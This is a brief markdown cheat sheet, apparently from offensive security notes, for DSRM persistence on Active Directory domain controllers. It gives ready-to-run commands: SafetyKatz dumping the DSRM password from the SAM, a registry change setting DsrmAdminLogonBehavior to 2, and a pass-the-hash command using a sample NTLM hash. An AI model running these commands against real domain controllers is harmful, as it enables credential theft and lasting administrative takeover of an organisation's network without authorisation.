# Methodology
>1. Dump DSRM password
>2. Change logon behavior for the DSRM account.
>3. Pass-The-Hash.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Dump local admin DSRM password on the domain controller:**
```cmd
SafetyKatz.exe '"token::elevate" "lsadump::sam"'
```

**Change login behavior for the local admin on the DC:**
```powershell
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
```

**If property already exists**
```powershell
Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
```

**Pass The hash:**
```cmd
SafetyKatz.exe '"sekurlsa::pth /domain:contoso.local /user:Administrator /ntlm:917ecdd1b4287f7051542d0241900cf0 /run:powershell.exe"'
```